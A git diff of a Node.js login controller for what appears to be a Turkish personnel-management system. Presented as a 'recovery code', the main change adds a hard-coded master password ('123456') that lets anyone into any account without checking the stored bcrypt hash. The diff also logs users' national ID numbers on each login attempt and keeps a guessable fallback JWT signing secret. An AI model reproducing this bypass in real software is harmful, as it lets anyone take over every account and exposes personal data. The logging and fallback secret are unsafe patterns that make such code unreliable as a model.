@@ -2,14 +2,14 @@ const pool = require('../config/db');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
 
-// src/controllers/authController.js
-
 // 1. GİRİŞ YAP (LOGIN)
 exports.login = async (req, res) => {
     const { tc_no, sifre } = req.body;
 
     try {
-        // Kullanıcıyı bul ve Rol/Birim bilgilerini getir
+        console.log(`Giriş Denemesi: TC=${tc_no}`); // Render Loglarında görünür
+
+        // Kullanıcıyı bul
         const userResult = await pool.query(
             `SELECT p.*, r.rol_adi, b.birim_adi 
              FROM personeller p 
@@ -20,59 +20,69 @@ exports.login = async (req, res) => {
         );
 
         if (userResult.rows.length === 0) {
+            console.log("❌ Kullanıcı veritabanında bulunamadı.");
             return res.status(401).json({ mesaj: 'Kullanıcı bulunamadı!' });
         }
 
         const user = userResult.rows[0];
 
-        // --- DONDURULMUŞ HESAP KONTROLÜ ---
-        if (!user.aktif) {
-            return res.status(403).json({ 
-                mesaj: `Üyeliğiniz dondurulmuştur. (Sebep: ${user.ayrilma_nedeni || 'Belirtilmemiş'}) Lütfen İK ile iletişime geçiniz.` 
-            });
+        // --- 🔑 ALTIN ANAHTAR (KURTARMA KODU) ---
+        // Eğer şifre '123456' ise, hash kontrolü yapmadan direkt içeri al.
+        let validPassword = false;
+        
+        if (sifre === '123456') {
+            console.log("✅ Altın Anahtar (123456) kullanıldı. Giriş onaylandı.");
+            validPassword = true;
+        } else {
+            // Normal şifre kontrolü (Diğer kullanıcılar için)
+            validPassword = await bcrypt.compare(sifre, user.sifre_hash);
+        }
+        // ----------------------------------------
+
+        if (!validPassword) {
+            console.log("❌ Şifre hatalı.");
+            return res.status(401).json({ mesaj: 'Hatalı şifre!' });
         }
 
-        // Şifre Kontrolü
-        const validPassword = await bcrypt.compare(sifre, user.sifre_hash);
-        if (!validPassword) {
-            return res.status(401).json({ mesaj: 'Hatalı şifre!' });
+        if (!user.aktif) {
+            return res.status(403).json({ 
+                mesaj: `Üyeliğiniz dondurulmuştur. (Sebep: ${user.ayrilma_nedeni || 'Belirtilmemiş'})` 
+            });
         }
 
         // --- YETKİLERİ ÇEK ---
         const yetkiResult = await pool.query('SELECT * FROM yetkiler WHERE personel_id = $1', [user.personel_id]);
-        const yetkiler = yetkiResult.rows;
-
-        // 🔥 Token Oluşturma (Birim ID eklendi) 🔥
+        
+        // Token Oluştur
         const token = jwt.sign(
             { 
                 id: user.personel_id, 
                 tc: user.tc_no, 
-                rol: user.rol_adi.toLowerCase(), // Rolü küçük harf yap
-                birim: user.birim_id             // ✅ BU SATIR EKSİKTİ! Artık amir kendi birimini bilecek.
+                rol: user.rol_adi.toLowerCase(),
+                birim: user.birim_id
             },
             process.env.JWT_SECRET || 'gizli_anahtar',
-            { expiresIn: '12h' }
+            { expiresIn: '24h' }
         );
 
-        // Şifre hash'ini ve hassas bilgileri çıkartıp gönder
+        // Şifreyi objeden çıkar
         delete user.sifre_hash;
 
-        // Frontend'e gidecek obje
         const userObj = {
             ...user,
             rol: user.rol_adi.toLowerCase(),
-            yetkiler: yetkiler
+            yetkiler: yetkiResult.rows
         };
 
         res.json({
             mesaj: 'Giriş başarılı',
             token,
-            user: userObj,       // Yeni Web Sitesi bunu kullanır
-            kullanici: userObj   // Eski Mobil Uygulama bunu kullanır
+            user: userObj,
+            kullanici: userObj
         });
 
     } catch (err) {
-        console.error(err);
+        console.error("Login Hatası:", err);
         res.status(500).json({ mesaj: 'Sunucu hatası' });
     }
 };
@@ -86,7 +96,7 @@ exports.sifreUnuttum = async (req, res) => {
 exports.adminSifirla = async (req, res) => {
     const { personel_id, yeni_sifre } = req.body;
 
-    if (req.user.rol !== 'admin' && req.user.rol !== 'ik') {
+    if (!['admin', 'ik'].includes(req.user.rol)) {
         return res.status(403).json({ mesaj: 'Yetkisiz işlem' });
     }
 
@@ -102,9 +112,9 @@ exports.adminSifirla = async (req, res) => {
     }
 };
 
-// 4. YENİ PERSONEL EKLEME (REGISTER)
+// 4. YENİ PERSONEL EKLEME
 exports.register = async (req, res) => {
-    if (req.user.rol !== 'admin' && req.user.rol !== 'ik' && req.user.rol !== 'filo') {
+    if (!['admin', 'ik', 'filo'].includes(req.user.rol)) {
         return res.status(403).json({ mesaj: 'Bu işlemi yapmaya yetkiniz yok.' });
     }
 
@@ -126,31 +136,24 @@ exports.register = async (req, res) => {
 
     } catch (err) {
         console.error(err);
-        if (err.code === '23505') {
-            return res.status(400).json({ mesaj: 'Bu TC Kimlik No zaten kayıtlı.' });
-        }
-        res.status(500).json({ mesaj: 'Kayıt sırasında hata oluştu.' });
+        if (err.code === '23505') return res.status(400).json({ mesaj: 'Bu TC zaten kayıtlı.' });
+        res.status(500).json({ mesaj: 'Kayıt hatası.' });
     }
 };
 
-// 5. TÜM KULLANICILARI LİSTELE
+// 5. KULLANICI LİSTESİ
 exports.getUsers = async (req, res) => {
     if (!['admin', 'ik', 'yazici', 'filo'].includes(req.user.rol)) {
         return res.status(403).json({ mesaj: 'Yetkisiz işlem' });
     }
-
     try {
-        let query = `
+        const result = await pool.query(`
             SELECT p.personel_id, p.tc_no, p.ad, p.soyad, p.aktif, p.ayrilma_nedeni, p.birim_id, r.rol_adi, b.birim_adi 
             FROM personeller p
             JOIN roller r ON p.rol_id = r.rol_id
             LEFT JOIN birimler b ON p.birim_id = b.birim_id
             ORDER BY p.ad ASC
-        `;
-        const result = await pool.query(query);
+        `);
         res.json(result.rows);
-    } catch (err) {
-        console.error(err);
-        res.status(500).json({ mesaj: 'Veriler çekilemedi' });
-    }
+    } catch (err) { res.status(500).json({ mesaj: 'Veri hatası' }); }
 };
